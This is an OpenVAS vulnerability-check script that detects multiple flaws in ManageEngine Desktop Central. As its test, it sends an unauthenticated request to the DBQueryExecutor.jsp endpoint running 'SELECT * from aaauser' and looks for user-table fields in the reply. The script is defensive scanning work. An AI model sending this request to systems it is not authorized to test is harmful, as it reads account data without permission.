###############################################################################
# OpenVAS Vulnerability Test
#
# ZOHO ManageEngine Desktop Central Multiple Vulnerabilities-Apr18
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (C) 2018 Greenbone Networks GmbH http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:zohocorp:manageengine_desktop_central";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.813213");
  script_version("2019-05-03T08:55:39+0000");
  script_cve_id("CVE-2018-5337", "CVE-2018-5338", "CVE-2018-5339", "CVE-2018-5341");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2019-05-03 08:55:39 +0000 (Fri, 03 May 2019)");
  script_tag(name:"creation_date", value:"2018-04-19 15:26:06 +0530 (Thu, 19 Apr 2018)");
  script_name("ZOHO ManageEngine Desktop Central Multiple Vulnerabilities-Apr18");

  script_tag(name:"summary", value:"This host is installed with ManageEngine
  Desktop Central and is prone to multiple vulnerabilities");

  script_tag(name:"vuldetect", value:"Send the crafted HTTP GET request and
  confirm SQL query execution from the response.");

  script_tag(name:"insight", value:"Multiple flaws are due to,

  - The missing authentication/authorization on a database query mechanism.

  - An insufficient enforcement of database query type restrictions.

  - The missing server side check on file type/extension when uploading and
    modifying scripts and

  - The directory traversal in SCRIPT_NAME field when modifying existing
    scripts");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers
  to write arbitrary files, gain access to unrestricted resources and execute
  remote code.");

  script_tag(name:"affected", value:"Zoho ManageEngine Desktop Central version
  10.0.184 and prior.");

  script_tag(name:"solution", value:"Upgrade to ManageEngine Desktop Central build
  version 10.0.208 or later. Please see the references for more information.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"exploit");
  script_xref(name:"URL", value:"https://www.manageengine.com");
  script_xref(name:"URL", value:"https://www.nccgroup.trust/uk/our-research/technical-advisory-multiple-vulnerabilities-in-manageengine-desktop-central");

  script_copyright("Copyright (C) 2018 Greenbone Networks GmbH");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_dependencies("gb_manage_engine_desktop_central_detect.nasl");
  script_mandatory_keys("ManageEngine/Desktop_Central/installed");
  script_require_ports("Services/www", 8040);
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!mePort = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:mePort)) exit(0);
if( dir == "/" ) dir = "";

url = dir + "/jsp/admin/DBQueryExecutor.jsp?actionFrom=getResult&query=SELECT%20*%20from%20aaauser;";
if(http_vuln_check(port:mePort, url: url, pattern:"execute SQL queries", extra_check: make_list(">CREATEDTIME<",
                   ">USER_ID<", ">LAST_NAME<", "retrieve any specific  information", "Query Executor"),
                   check_header:TRUE))
{
  report = report_vuln_url(port:mePort, url:url);
  security_message(port:mePort, data:report);
  exit(0);
}
exit(0);
